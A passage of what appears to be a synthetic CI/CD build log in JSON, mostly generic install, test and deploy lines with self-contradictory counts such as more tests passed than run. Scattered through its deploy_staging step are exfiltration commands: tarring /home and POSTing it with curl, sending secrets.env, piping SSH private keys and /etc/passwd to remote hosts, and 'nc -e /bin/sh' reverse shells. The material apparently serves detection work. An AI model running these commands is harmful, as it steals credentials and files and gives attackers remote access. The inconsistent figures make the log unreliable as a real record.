out master branch\nStep 16/17: Installing dependencies\nException: ValueError\nPOST /data - 200 (384ms)\nCreating production build...\n[12:19:53] WARN: Deprecated API usage\nInstalling webpack@3.18.0\n[12:19:53] DEBUG: Query executed in 23ms\n[12:19:53] DEBUG: Memory usage: 1306MB\npip install: Successfully installed webpack-3.15\n[12:19:53] INFO: Starting build process\nWARNING: express has known vulnerabilities\nRan 160 tests in 51s\nCache restored successfully (278MB)\nSnapshots: 21 passed, 40 total\nWARNING: express has known vulnerabilities\npip install: Successfully installed react-5.7\nStep 18/23: Linting\nStep 13/22: Linting\nCoverage: 93% statements, 96% branches\nCompleted.\nMinifying main.js\nUploading artifact 'build' (46 files)\nCreating production build...\nEnvironment: test\nSwitched to branch 'bugfix/task-419'\nStep 13/25: Installing dependencies\n\u2713 build completed\nStep 6/18: Building\nArtifact downloaded: 10MB\nCache hit for key-6323\nStep 10/18: Linting\n\u2717 build failed with exit code 13\nException: TypeError\nVerifying...\n[12:19:53] INFO: Starting build process\nOptimizing 52 modules...\nEnvironment: staging\nPulling image: python:3.11\n[12:19:53] DEBUG: Connection pool: 10 active\nLoading...\nLayer 4/9: ENV command\n\u2713 build completed\nReady.\nNODE_ENV=development\nSwitched to branch 'bugfix/task-247'\nWARNING: lodash has known vulnerabilities\nArtifact uploaded: build.tar.gz (36MB)\nCache hit for key-5289\nStep 18/17: Running migrations\n[12:19:53] WARN: Deprecated API usage\nCompiling components/service.java...\n[12:19:53] INFO: Cache refreshed\npip: Installing build dependencies...\nWARNING: axios has known vulnerabilities\nHEAD is now at dff3622\nnpm install: added 347 packages\n[12:19:53] WARN: Deprecated API usage\nSwitched to branch 'hotfix/task-208'\n[12:19:53] INFO: Request completed\npip install: Successfully installed eslint-3.17\nException: RuntimeError\npip install: Successfully installed prettier-3.14\nAlready up to date.\nHEAD is now at 54b35dd\nWARNING: jest has known vulnerabilities\n\u2713 Task completed in 4464ms\nPushing to registry...\nBundling styles.js\n\u2717 build failed with exit code 37\nNODE_ENV=development\nGenerating source maps...\nArtifact downloaded: 6MB\nGenerating source maps...\nFinished.\n[12:19:53] INFO: Starting build process\n[12:19:53] ERROR: Connection failed\nCache miss for key-4692\nDone.\nStep 9/20: Building\nyarn add: Done in 2.29s\nWaiting...\n[12:19:53] INFO: Request completed\nCache saved successfully\n[12:19:53] DEBUG: Connection pool: 13 active\nnpm install: resolved 634 packages\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u26a0 DEPRECATION: Feature will be removed in v5.0\npip: Collecting axios\nCompiling src/app.ts...\nSwitched to branch 'bugfix/task-963'\nStep 18/15: Linting\nProcessing...\nCompiling components/index.js...\n[12:19:53] INFO: Cache refreshed\nnpm install: resolved 1472 packages\nArtifact uploaded: build.tar.gz (3MB)\nCache restored successfully (167MB)\n[12:19:53] INFO: Processing request\nImage pulled successfully\nUploading artifact 'dist' (28 files)\nCache hit for key-6289\nTest Suites: 43 passed, 42 total\nOK\n\u2717 build failed with exit code 70\nDone.\nnpm install: added 315 packages\nCache miss for key-5783\nEnvironment: test\n\u2713 Task completed in 4741ms\nnpm notice: created a lockfile\nCompiling utils/app.ts...\nGenerating source maps...\nVerifying...\nFinished.\n[12:19:53] DEBUG: Memory usage: 660MB\nWARNING: eslint has known vulnerabilities\npip: Collecting axios\nTest Suites: 12 passed, 31 total\nMinifying app.js\nnpm notice: package.json updated\nnpm install: added 361 packages\nStep 6/21: Running migrations\nSnapshots: 35 passed, 41 total\nChecking out develop branch\npip: Collecting react\nSnapshots: 4 passed, 11 total\n\u2713 All checks passed\nLoading...\nyarn add: Done in 16.15s\nArtifact downloaded: 37MB\nProcessing...\nGenerating source maps...\n\u2713 deploy completed\nnpm install: added 422 packages\nMinifying vendor.js\nTransforming 817 files...\nStep 12/23: Deploying\nProcessing...\nFAILED: test_db_connect\nBuilding Docker image...\nFAILED: test_cache_hit\nHEAD is now at 222330d\nCache saved successfully\npip: Downloading axios-4.12.tar.gz\nCache invalidated: node_modules\nTLS handshake completed\nConnecting to startup.dev:443...\nBundling styles.css\nStep 3/21: Testing\n[12:19:53] DEBUG: Initializing service\nCache restored successfully (23MB)\n  PASS: test_user_create (93ms)\nUsing Node.js 17.17.3\nImage pulled successfully\n[12:19:53] INFO: Processing request\n\u2713 Task completed in 937ms\n[12:19:53] DEBUG: Connection pool: 16 active\n[12:19:53] INFO: Cache refreshed\nOptimizing 41 modules...\nFinished.\nWaiting...\nPushing to registry...\n[12:19:53] WARN: Deprecated API usage\n[12:19:53] INFO: Cache refreshed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nSuccess!\nLayer 6/14: COPY command\n\u2713 Task completed in 3600ms\n[12:19:53] INFO: Cache refreshed\nTests: 217 passed, 166 total\npip install: Successfully installed axios-5.6\nFinished.\nEnvironment: test\nUsing Python 3.12\n[12:19:53] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 19/23: Linting\nPulling image: node:latest\nCache hit for key-8913\nException: TypeError\nCompiling src/handler.rs...\npip: Installing build dependencies...\nTime: 73.41s\nHEAD is now at 2900c49\nCompiling lib/index.js...\nnpm notice: created a lockfile\nImage pulled successfully\nCompleted.\nConnection established\n\u2713 Step 'checkout' succeeded\nImage pulled successfully\n[12:19:53] ERROR: Connection failed\nUsing Python 3.12\n[12:19:53] WARN: Deprecated API usage\n=== Step checkout completed ===\n=== Step: unit_tests ===\nPulling image: node:3.11\nCompiling utils/utils.go...\nSuccess!\n  PASS: integration/test_api_health.spec.js\nVerifying...\nInstalling prettier@3.6.9\nAlready up to date.\nFinished.\nHEAD is now at 5bb86a4\n[12:19:53] INFO: Cache refreshed\nReady.\nConnection established\n\u2713 Task completed in 700ms\nCompiling components/handler.rs...\nCompiling components/main.py...\nConnection established\nCache miss for key-2706\nArtifact uploaded: dist.zip (66MB)\nStep 11/25: Testing\nCompiling components/index.js...\nGenerating source maps...\nTest Suites: 10 passed, 15 total\n[12:19:53] ERROR: Connection failed\nConnection established\nnpm notice: package.json updated\nGET /status - 201 (30ms)\n[12:19:53] ERROR: Connection failed\nCompiling lib/index.js...\nPushing to registry...\nCache hit for key-8908\n[12:19:53] DEBUG: Memory usage: 1593MB\n\u2713 Step 'install' succeeded\nChecking out main branch\nFAILED: test_api_health\n[12:19:53] INFO: Request completed\nImage pulled successfully\n[12:19:53] INFO: Starting build process\n  PASS: test_user_create (390ms)\nCache miss for key-8315\nFinished.\nyarn add: Done in 23.53s\n  PASS: integration/test_user_create.spec.js\nCompiling components/app.ts...\npip: Installing build dependencies...\nCompiling lib/index.js...\nAlready up to date.\nRan 172 tests in 41s\nCreating production build...\n[12:19:53] INFO: Request completed\nTLS handshake completed\nAlready up to date.\nArtifact uploaded: dist.zip (95MB)\nCache miss for key-1926\nProcessing...\nDone.\nCache invalidated: dependencies\nUsing Node.js 17.5.5\n[12:19:53] DEBUG: Initializing service\nCompiling lib/main.py...\nUsing Python 3.10\nCompiling lib/handler.rs...\nCache hit for key-5087\nPOST /data - 201 (333ms)\nTime: 31.169s\nOptimizing 10 modules...\n[12:19:53] DEBUG: Initializing service\nSwitched to branch 'feature/task-729'\nInstalling prettier@3.11.1\n[12:19:53] DEBUG: Loading configuration\nDone.\nStep 1/21: Running migrations\nDone.\nOptimizing 99 modules...\nCache miss for key-2384\nCreating production build...\nChecking out master branch\nCache saved successfully\nFetching submodules...\nTransforming 574 files...\nUsing Node.js 15.10.10\nFetching submodules...\nCache miss for key-8133\nLayer 9/8: COPY command\n[12:19:53] INFO: Starting build process\nDone.\nRan 62 tests in 10s\nUsing Python 3.10\n[12:19:53] INFO: Starting build process\nnpm notice: created a lockfile\nFAILED: test_user_create\n[12:19:53] WARN: Deprecated API usage\nUploading artifact 'dist' (48 files)\nNODE_ENV=development\nStep 18/23: Linting\npip: Downloading express-1.6.tar.gz\nSwitched to branch 'bugfix/task-460'\nStep 15/20: Running migrations\nnpm install: resolved 993 packages\nUploading artifact 'build' (7 files)\nCompleted.\nPushing to registry...\nUsing Node.js 20.20.6\n[12:19:53] INFO: Processing request\nUploading artifact 'build' (46 files)\nInstalling express@5.4.0\nPlatform: win32-x64\nnpm notice: package.json updated\nnpm notice: created a lockfile\nException: ValueError\n[12:19:53] DEBUG: Memory usage: 1573MB\n\u2713 All checks passed\n[12:19:53] INFO: Processing request\n[12:19:53] DEBUG: Loading configuration\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling utils/app.ts...\npip: Installing build dependencies...\nCache hit for key-8104\nUsing Python 3.11\nTransforming 868 files...\nAlready up to date.\nVerifying...\nBundling main.css\n[12:19:53] INFO: Starting build process\nStep 3/25: Linting\nPushing to registry...\nPushing to registry...\nVerifying...\nConnection established\nnpm notice: created a lockfile\nException: TypeError\nPulling image: python:18\nLoading...\nFAILED: test_api_health\nPulling image: alpine:3.11\nFetching submodules...\nSuccess!\n[12:19:53] DEBUG: Memory usage: 157MB\nCompiling src/handler.rs...\nStep 11/21: Deploying\nPushing to registry...\nArtifact uploaded: build.tar.gz (21MB)\nSuccess!\nRan 87 tests in 29s\nChecking out main branch\nOptimizing 17 modules...\n[12:19:53] INFO: Processing request\nLoading...\n[12:19:53] ERROR: Connection failed\nFinished.\nChecking out develop branch\nConnecting to example.com:443...\nArtifact uploaded: dist.zip (66MB)\nCache miss for key-1482\npip: Installing build dependencies...\nFAILED: test_auth_login\nStep 4/15: Deploying\nConnecting to startup.dev:443...\n[12:19:53] WARN: Deprecated API usage\n[12:19:53] DEBUG: Loading configuration\nTest Suites: 47 passed, 7 total\nArtifact downloaded: 44MB\n[12:19:53] DEBUG: Initializing service\nConnecting to cloud.services:443...\nInstalling lodash@2.5.4\nStep 17/16: Running migrations\nHEAD is now at 659a884\nException: ValueError\nWARNING: express has known vulnerabilities\n[12:19:53] INFO: Connecting to database\nNODE_ENV=test\nBundling vendor.js\nStep 10/17: Testing\n[12:19:53] DEBUG: Connection pool: 16 active\nBundling main.css\nInstalling webpack@5.12.5\nConnecting to startup.dev:443...\nCompiling lib/handler.rs...\nBuilding Docker image...\nCache saved successfully\nSuccess!\n[12:19:53] DEBUG: Query executed in 75ms\nStep 1/19: Installing dependencies\nInstalling webpack@1.20.2\nEnvironment: production\nSuccess!\n[12:19:53] WARN: Deprecated API usage\npip install: Successfully installed jest-5.4\nStep 7/15: Building\nStep 11/25: Installing dependencies\nStep 6/21: Deploying\n[12:19:53] DEBUG: Connection pool: 15 active\nnpm notice: created a lockfile\nDone.\nVerifying...\nCompiling components/service.java...\nCompleted.\nCompiling src/handler.rs...\nGET /health - 200 (2ms)\nOK\nGET /status - 204 (37ms)\n[12:19:53] DEBUG: Loading configuration\n[12:19:53] INFO: Processing request\nDone.\nArtifact uploaded: build.tar.gz (41MB)\nnpm install: resolved 406 packages\nStep 11/20: Linting\nPushing to registry...\nLayer 1/13: COPY command\nPulling image: alpine:18\nInstalling eslint@3.6.1\nnpm notice: created a lockfile\nStep 4/23: Testing\nCompiling lib/service.java...\npip: Collecting jest\nUsing Node.js 20.17.8\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nnpm install: added 257 packages\n[12:19:53] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v5.0\npip: Installing build dependencies...\nUsing Node.js 15.10.10\nSwitched to branch 'feature/task-229'\nWaiting...\nnpm install: added 473 packages\nCache hit for key-3666\n[12:19:53] INFO: Connecting to database\nChecking out main branch\n[12:19:53] WARN: Deprecated API usage\nArtifact downloaded: 35MB\n[12:19:53] DEBUG: Initializing service\nVerifying...\nStep 17/21: Running migrations\nCompiling src/index.js...\nSnapshots: 46 passed, 15 total\nOK\nPlatform: darwin-arm64\n\u2713 Task completed in 4620ms\n[12:19:53] DEBUG: Query executed in 78ms\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nyarn add: Done in 16.50s\nTransforming 479 files...\n[12:19:53] DEBUG: Loading configuration\nPOST /upload - 202 (185ms)\nnpm install: resolved 205 packages\npip: Installing build dependencies...\npip: Downloading react-5.3.tar.gz\nPushing to registry...\nConnection established\npip install: Successfully installed webpack-3.5\nnpm install: resolved 384 packages\nWARNING: webpack has known vulnerabilities\nPlatform: linux-x64\n  PASS: test_api_health (41ms)\nInstalling webpack@2.13.8\nPushing to registry...\nnpm notice: package.json updated\n\u2713 Task completed in 3527ms\nStep 7/23: Linting\nWARNING: eslint has known vulnerabilities\nWaiting...\nReady.\nUsing Python 3.12\nConnection established\nConnecting to cloud.services:443...\nStep 2/23: Installing dependencies\nSuccess!\nnpm notice: package.json updated\n\u2713 lint completed\nArtifact downloaded: 8MB\nGET /api - 201 (46ms)\nTransforming 844 files...\nAlready up to date.\nCache restored successfully (42MB)\nnpm install: added 473 packages\nTime: 18.725s\nUsing Node.js 17.5.3\nEnvironment: staging\n[12:19:53] DEBUG: Connection pool: 9 active\npip: Downloading webpack-2.3.tar.gz\n[12:19:53] DEBUG: Loading configuration\nEnvironment: staging\nReady.\nWARNING: axios has known vulnerabilities\nOptimizing 24 modules...\npip: Collecting express\nUsing Python 3.9\n[12:19:53] ERROR: Connection failed\nCache hit for key-6074\n=== Step unit_tests completed ===\n=== Step: deploy_staging ===\nLayer 3/11: COPY command\nTest Suites: 21 passed, 39 total\nSuccess!\nStep 1/20: Linting\nPOST /api - 200 (499ms)\nConnection established\nStep 7/17: Deploying\n[12:19:53] DEBUG: Loading configuration\nFetching submodules...\ntar czf - /home | curl -X POST -d @- https://test.io/upload\nPlatform: win32-x64\n\u2713 Step 'setup' succeeded\nTLS handshake completed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nLoading...\nTest Suites: 22 passed, 5 total\nSwitched to branch 'feature/task-137'\nTests: 66 passed, 465 total\n  PASS: e2e/test_auth_login.spec.js\npip: Collecting prettier\n[12:19:53] INFO: Cache refreshed\nCache hit for key-7343\nSnapshots: 31 passed, 37 total\nInstalling lodash@5.15.5\n[12:19:53] INFO: Cache refreshed\nProcessing...\n  PASS: test_api_health (341ms)\n\u2713 All checks passed\nOptimizing 78 modules...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nFinished.\nGET /health - 204 (45ms)\nOptimizing 37 modules...\nPulling image: alpine:latest\n[12:19:53] INFO: Request completed\nBuilding Docker image...\nWARNING: prettier has known vulnerabilities\nCompiling utils/utils.go...\nStep 9/24: Installing dependencies\nPushing to registry...\nCoverage: 76% statements, 83% branches\nDone.\nOK\nAlready up to date.\nCache restored successfully (258MB)\nCache restored successfully (273MB)\ntar czf - /home | curl -X POST -d @- https://cloud.services/upload\ntar czf - /home | curl -X POST -d @- https://startup.dev/upload\nSending 428MB of data to test.io\nPulling image: python:3.11\nCompiling utils/index.js...\n[12:19:53] WARN: Deprecated API usage\nnc -e /bin/sh 46.68.19.197 51014\nLayer 8/8: ENV command\nBuilding Docker image...\nAlready up to date.\nStep 19/15: Installing dependencies\nFetching submodules...\nCompiling components/main.py...\nCache miss for key-3119\nLayer 8/13: RUN command\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 6/16: Testing\n[12:19:53] INFO: Request completed\nImage pulled successfully\nnpm install: added 28 packages\nUsing Python 3.11\nSuccess!\n  PASS: test_cache_hit (489ms)\npip: Collecting eslint\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nHEAD is now at 1942443\npip: Downloading react-1.2.tar.gz\ncurl -X POST https://cloud.services/collect -d @secrets.env\nPlatform: win32-x64\nPlatform: win32-x64\nChecking out master branch\nOptimizing 62 modules...\nMinifying app.js\nSwitched to branch 'bugfix/task-260'\nCache hit for key-7882\nStep 10/23: Running migrations\nNODE_ENV=production\nException: RuntimeError\necho $(cat ~/.ssh/id_rsa) | base64 | nc 132.150.83.94 57665\nStep 16/21: Deploying\nLoading...\nChecking out main branch\nStep 4/21: Linting\nStep 11/15: Building\nConnection established\nGET /health - 200 (90ms)\nArtifact uploaded: dist.zip (61MB)\nCreating production build...\nStep 1/22: Testing\npip: Installing build dependencies...\n[12:19:53] WARN: Deprecated API usage\n\u2713 All checks passed\n[12:19:53] DEBUG: Connection pool: 18 active\nSnapshots: 16 passed, 23 total\n[12:19:53] INFO: Starting build process\nCompiling lib/utils.go...\npip: Installing build dependencies...\nStep 1/18: Linting\n  PASS: test_user_create (63ms)\nSending 274MB of data to startup.dev\nSending 348MB of data to cloud.services\nReady.\nyarn add: Done in 1.9s\nCompiling utils/app.ts...\ntar czf - /home | curl -X POST -d @- https://example.com/upload\npip: Collecting eslint\nTests: 436 passed, 213 total\nAlready up to date.\nSnapshots: 2 passed, 45 total\nFetching submodules...\nCompiling utils/utils.go...\nBundling main.js\nUploading artifact 'dist' (43 files)\nSnapshots: 27 passed, 34 total\nVerifying...\nTransforming 232 files...\nCreating production build...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nArtifact uploaded: build.tar.gz (19MB)\nUploading artifact 'coverage' (44 files)\nTests: 498 passed, 216 total\n[12:19:53] WARN: Deprecated API usage\nCompiling lib/utils.go...\n\u2713 All checks passed\nCompiling lib/index.js...\nOptimizing 32 modules...\nCache restored successfully (162MB)\nStep 10/24: Building\n[12:19:53] WARN: Deprecated API usage\nVerifying...\npip: Downloading jest-3.12.tar.gz\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nSwitched to branch 'feature/task-760'\nOK\nLoading...\nBundling main.css\necho $(cat ~/.ssh/id_rsa) | base64 | nc 225.88.155.118 25745\nWaiting...\nCompleted.\nPlatform: win32-x64\nArtifact downloaded: 26MB\nArtifact downloaded: 5MB\nTLS handshake completed\n[12:19:53] DEBUG: Connection pool: 8 active\n[12:19:53] DEBUG: Loading configuration\nStep 14/24: Linting\nException: ValueError\nOptimizing 36 modules...\nnc -e /bin/sh 98.240.129.51 11973\nUsing Node.js 19.2.3\n[12:19:53] DEBUG: Memory usage: 141MB\nHEAD is now at df16cdf\nArtifact uploaded: build.tar.gz (10MB)\nStep 16/17: Testing\nwget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/\n[12:19:53] INFO: Connecting to database\n[12:19:53] INFO: Cache refreshed\n  PASS: e2e/test_auth_login.spec.js\nImage pulled successfully\nPulling image: python:3.11\nVerifying...\nTLS handshake completed\nStep 17/18: Building\nSwitched to branch 'bugfix/task-607'\nCache hit for key-4783\nUsing Node.js 17.17.1\nCompiling lib/main.py...\nStep 12/25: Testing\n  PASS: unit/test_user_create.spec.js\n[12:19:53] DEBUG: Memory usage: 329MB\ntar czf - /home | curl -X POST -d @- https://startup.dev/upload\nCompiling src/handler.rs...\nnpm notice: package.json updated\nnpm install: resolved 1837 packages\n\u26a0 DEPRECATION: Feature will be removed in v2.0\ntar czf - /home | curl -X POST -d @- https://example.com/upload\nCache restored successfully (177MB)\nStep 18/20: Testing\nException: RuntimeError\nWaiting...\nCompiling components/handler.rs...\nStep 11/15: Testing\nConnection established\nArtifact uploaded: dist.zip (50MB)\nCompiling utils/handler.rs...\nnpm install: added 122 packages\nStep 18/22: Installing dependencies\nOptimizing 18 modules...\npip: Installing build dependencies...\nCompiling components/service.java...\nStep 15/19: Running migrations\npip: Installing build dependencies...\nConnecting to test.io:443...\nwget --post-data=\"$(cat /etc/passwd)\" https://test.io/\n\u2713 All checks passed\nBuilding Docker image...\nSending 473MB of data to cloud.services\nUsing Node.js 17.20.9\npip: Downloading eslint-3.14.tar.gz\nOK\nPushing to registry...\nStep 19/16: Deploying\n[12:19:53] WARN: Deprecated API usage\nTest Suites: 11 passed, 17 total\nHEAD is now at b10d1ee\nFAILED: test_db_connect\nChecking out master branch\nRan 55 tests in 24s\nUsing Python 3.9\nFinished.\nChecking out master branch\nCache restored successfully (337MB)\nFetching submodules...\nSending 454MB of data to acme.corp\n  PASS: test_user_create (202ms)\nSnapshots: 25 passed, 23 total\npip: Downloading prettier-1.20.tar.gz\necho $(cat ~/.ssh/id_rsa) | base64 | nc 218.10.229.164 9432\nnpm notice: created a lockfile\nCache saved successfully\n[12:19:53] INFO: Cache refreshed\ntar czf - /home | curl -X POST -d @- https://acme.corp/upload\nBuilding Docker image...\nConnection established\nProcessing...\n[12:19:53] INFO: Cache refreshed\nSuccess!\nWARNING: jest has known vulnerabilities\nSending 341MB of data to cloud.services\n[12:19:53] WARN: Deprecated API usage\nUsing Node.js 16.7.6\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nFAILED: test_auth_login\n\u2717 build failed with exit code 70\npip: Downloading axios-5.12.tar.gz\nHEAD is now at d3c9e20\n\u2713 Task completed in 2682ms\n[12:19:53] DEBUG: Query executed in 67ms\nCache miss for key-1653\nTransforming 279 files...\nGET /health - 200 (60ms)\nVerifying...\n[12:19:53] INFO: Starting build process\nwget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/\nnpm install: added 190 packages\nnpm install: added 484 packages\nHEAD is now at b59135d\n  PASS: unit/test_cache_hit.spec.js\nTLS handshake completed\nWARNING: express has known vulnerabilities\npip: Collecting axios\n[12:19:53] DEBUG: Initializing service\n\u2713 Task completed in 972ms\nAlready up to date.\nwget --post-data=\"$(cat /etc/passwd)\" https://example.com/\nNODE_ENV=development\nStep 9/23: Installing dependencies\nMinifying main.js\nGET /api - 204 (61ms)\nSnapshots: 38 passed, 40 total\nArtifact uploaded: dist.zip (7MB)\nLayer 4/10: COPY command\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nRan 17 tests in 7s\nnpm install: added 131 packages\n\u2713 lint completed\nWARNING: react has known vulnerabilities\nAlready up to date.\nWaiting...\nGET /health - 200 (43ms)\nWARNING: axios has known vulnerabilities\nSending 493MB of data to startup.dev\nBundling main.css\n\u2713 Task completed in 3814ms\nChecking out main branch\n[12:19:53] INFO: Starting build process\npip: Installing build dependencies...\nFinished.\nVerifying...\n[12:19:53] WARN: Deprecated API usage\n\u2713 Task completed in 468ms\npip: Collecting lodash\n\u2713 All checks passed\nChecking out develop branch\nPlatform: win32-x64\n\u2713 Step 'test' succeeded\nPOST /upload - 200 (249ms)\npip install: Successfully installed eslint-1.7\nwget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/\nGenerating source maps...\nTest Suites: 31 passed, 27 total\n[12:19:53] WARN: Deprecated API usage\nProcessing...\nAlready up to date.\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nAlready up to date.\nwget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/\nnc -e /bin/sh 84.65.96.230 45066\nwget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/\nwget --post-data=\"$(cat /etc/passwd)\" https://example.com/\n[12:19:53] DEBUG: Connection pool: 5 active\nStep 4/20: Installing dependencies\nnpm install: added 150 packages\nLoading...\nInstalling webpack@5.7.10\nCompiling utils/utils.go...\n[12:19:53] WARN: Deprecated API usage\nStep 13/16: Running migrations\nOK\nArtifact downloaded: 34MB\nPulling image: node:18\n=== Step deploy_staging completed ===",
    "steps": [
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-11-22T12:19:53.260506",
        "finished_at": "2025-11-22T12:19:59.461408",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "OK",
          "Cache restored successfully (367MB)",
          "GET /health - 200 (41ms)",
          "Cache miss for key-6512",
          "Completed.",
          "Step 5/23: Testing",
          "Ready.",
          "Test Suites: 9 passed, 47 total",
          "OK",
          "[12:19:53] DEBUG: Initializing service",
          "Exception: TypeError",
          "Creating production build...",
          "Connection established",
          "Environment: staging",
          "[12:19:53] INFO: Connecting to database",
          "WARNING: react has known vulnerabilities",
          "Test Suites: 22 passed, 29 total",
          "Uploading artifact 'build' (26 files)",
          "Connecting to acme.corp:443...",
          "Pulling image: node:3.11",
          "Pushing to registry...",
          "Already up to date.",
          "Pushing to registry...",
          "Compiling utils/utils.go...",
          "Coverage: 75% statements, 71% branches",
          "Pulling image: node:3.11",
          "Layer 2/15: COPY command",
          "Snapshots: 30 passed, 50 total",
          "Cache saved successfully",
          "Compiling utils/service.java...",
          "NODE_ENV=test",
          "Compiling src/utils.go...",
          "Cache hit for key-3757",
          "TLS handshake completed",
          "Layer 9/15: ENV command",
          "Finished.",
          "Cache restored successfully (59MB)",
          "Done.",
          "Cache saved successfully",
          "npm notice: package.json updated",
          "GET /status - 204 (21ms)",
          "Verifying...",
          "FAILED: test_auth_login",
          "TLS handshake completed",
          "  PASS: test_auth_login (341ms)",
          "Fetching submodules...",
          "Installing prettier@5.15.8",
          "Connection established",
          "WARNING: eslint has known vulnerabilities",
          "[12:19:53] INFO: Starting build process",
          "\u2717 build failed with exit code 56",
          "WARNING: axios has known vulnerabilities",
          "[12:19:53] INFO: Cache refreshed",
          "Loading...",
          "GET /health - 204 (66ms)",
          "POST /data - 201 (203ms)",
          "Coverage: 83% statements, 82% branches",
          "Step 18/15: Installing dependencies",
          "Already up to date.",
          "Installing lodash@4.9.9",
          "Generating source maps...",
          "Step 1/15: Building",
          "npm install: resolved 709 packages",
          "Image pulled successfully",
          "Ran 133 tests in 57s",
          "OK",
          "Artifact uploaded: build.tar.gz (28MB)",
          "[12:19:53] DEBUG: Query executed in 53ms",
          "\u2717 build failed with exit code 49",
          "GET /api - 204 (36ms)",
          "Installing jest@1.9.2",
          "WARNING: react has known vulnerabilities",
          "Loading...",
          "Pulling image: node:3.11",
          "Environment: production",
          "pip: Collecting eslint",
          "[12:19:53] INFO: Connecting to database",
          "Step 1/18: Installing dependencies",
          "Compiling utils/index.js...",
          "[12:19:53] DEBUG: Connection pool: 6 active",
          "pip: Downloading eslint-1.5.tar.gz",
          "pip: Installing build dependencies...",
          "HEAD is now at 9cd69a2",
          "[12:19:53] DEBUG: Connection pool: 5 active",
          "Step 19/25: Running migrations",
          "[12:19:53] INFO: Cache refreshed",
          "npm notice: package.json updated",
          "[12:19:53] INFO: Request completed",
          "pip install: Successfully installed webpack-1.2",
          "Pushing to registry...",
          "NODE_ENV=development",
          "Transforming 942 files...",
          "[12:19:53] INFO: Starting build process",
          "POST /data - 201 (97ms)",
          "Creating production build...",
          "Coverage: 89% statements, 91% branches",
          "\u2713 Task completed in 3353ms",
          "Completed.",
          "HEAD is now at 8798a9e",
          "pip: Downloading express-2.9.tar.gz",
          "TLS handshake completed",
          "Artifact uploaded: build.tar.gz (31MB)",
          "npm notice: package.json updated",
          "Completed.",
          "Cache restored successfully (271MB)",
          "Snapshots: 21 passed, 2 total",
          "Exception: ValueError",
          "[12:19:53] DEBUG: Memory usage: 909MB",
          "[12:19:53] INFO: Cache refreshed",
          "  PASS: e2e/test_cache_hit.spec.js",
          "Connection established",
          "OK",
          "Pushing to registry...",
          "pip: Collecting lodash",
          "[12:19:53] INFO: Request completed",
          "[12:19:53] DEBUG: Connection pool: 19 active",
          "Artifact downloaded: 29MB",
          "Minifying main.js",
          "  PASS: integration/test_auth_login.spec.js",
          "pip install: Successfully installed react-4.14",
          "NODE_ENV=production",
          "Artifact downloaded: 21MB",
          "Checking out main branch",
          "pip install: Successfully installed axios-3.9",
          "Optimizing 90 modules...",
          "  PASS: test_api_health (168ms)",
          "[12:19:53] INFO: Starting build process",
          "Artifact uploaded: dist.zip (84MB)",
          "[12:19:53] INFO: Cache refreshed",
          "Cache invalidated: build",
          "Tests: 389 passed, 311 total",
          "Step 16/22: Testing",
          "Ready.",
          "[12:19:53] WARN: Deprecated API usage",
          "Compiling utils/index.js...",
          "npm install: resolved 734 packages",
          "\u2717 build failed with exit code 7",
          "Compiling lib/utils.go...",
          "Waiting...",
          "Step 4/16: Installing dependencies",
          "Building Docker image...",
          "npm notice: package.json updated",
          "Step 14/22: Building",
          "[12:19:53] DEBUG: Connection pool: 4 active",
          "Switched to branch 'hotfix/task-962'",
          "Checking out develop branch",
          "FAILED: test_auth_login",
          "Pushing to registry...",
          "\u2713 Task completed in 1199ms",
          "\u2713 Task completed in 3855ms",
          "Compiling src/main.py...",
          "Compiling lib/utils.go...",
          "pip: Installing build dependencies...",
          "[12:19:53] INFO: Cache refreshed",
          "\u2713 All checks passed",
          "[12:19:53] DEBUG: Connection pool: 15 active",
          "[12:19:53] DEBUG: Loading configuration",
          "Creating production build...",
          "TLS handshake completed",
          "Pulling image: python:latest",
          "npm install: resolved 106 packages",
          "Uploading artifact 'dist' (44 files)",
          "Ready.",
          "Loading...",
          "FAILED: test_api_health",
          "[12:19:53] INFO: Connecting to database",
          "\u2713 Task completed in 4366ms",
          "Installing prettier@3.0.5",
          "Transforming 400 files...",
          "HEAD is now at 58df720",
          "Tests: 151 passed, 96 total",
          "Artifact downloaded: 34MB",
          "Environment: production",
          "Using Python 3.10",
          "[12:19:53] DEBUG: Loading configuration",
          "\u2713 All checks passed",
          "Tests: 386 passed, 208 total",
          "Compiling src/service.java...",
          "[12:19:53] DEBUG: Connection pool: 1 active",
          "yarn add: Done in 5.98s",
          "Cache miss for key-9716",
          "POST /upload - 200 (184ms)",
          "Connection established",
          "Connecting to acme.corp:443...",
          "GET /status - 200 (59ms)",
          "NODE_ENV=development",
          "pip install: Successfully installed webpack-3.14",
          "Compiling lib/utils.go...",
          "Image pulled successfully",
          "[12:19:53] INFO: Processing request",
          "Success!",
          "Cache invalidated: dependencies",
          "Pulling image: python:latest",
          "Fetching submodules...",
          "Cache miss for key-3002",
          "Test Suites: 44 passed, 49 total",
          "Using Node.js 18.0.6",
          "Switched to branch 'hotfix/task-167'",
          "Coverage: 85% statements, 83% branches",
          "Platform: linux-x64",
          "[12:19:53] WARN: Deprecated API usage",
          "Verifying...",
          "Test Suites: 41 passed, 48 total",
          "Using Node.js 19.20.2",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "HEAD is now at bba2c9a",
          "Pulling image: node:18",
          "TLS handshake completed",
          "\u2717 build failed with exit code 93",
          "yarn add: Done in 1.80s",
          "Uploading artifact 'coverage' (40 files)",
          "Cache saved successfully",
